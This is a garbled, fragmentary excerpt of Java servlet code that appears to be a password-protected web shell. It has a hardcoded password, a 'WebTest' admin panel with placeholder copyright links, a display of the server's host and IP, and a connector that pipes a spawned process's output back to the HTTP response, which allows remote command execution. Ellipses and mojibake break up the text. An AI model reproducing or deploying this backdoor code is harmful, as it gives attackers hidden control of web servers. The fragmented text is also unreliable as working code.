...
private static final String PW = "w@@y.";  //password
...
try {
PrintWriter out = response.getWriter();
out.println("<html><head><title>WebTest</title><style type=\"text/css\">"+
...
"	  "+
"<span style=\"font:11px Verdana;\">Copyright &copy; 2015 Admin </span><a href=\"http://www.xxoo.com\" target=\"_blank\">www.xxoo.com</a></p>"+
"    </form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2015 <a href=\"http://www.baidu.com\" target=\"_blank\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=\"_blank\" href=\"http://www.baidu.com/\">[xoxo.Net]</a> All Rights Reserved."+
"</div>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
"	<tr class=\"head\">"+
"		<td><span style=\"float:right;\"><a href=\"http://www.baidu.com\" target=\"_blank\">WebTest Ver: 2015</a></span>"+request.getHeader("host")+" ("+InetAddress.getLocalHost().getHostAddress()+")</td>"+
"	</tr>"+
"	<tr class=\"alt1\">"+
...
new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//¡§?&#148;&#153;¡§¡§????&#228;&#191;&#161;&#230;&#129;??&#230;??&#129;&#227;&#128;&#130;
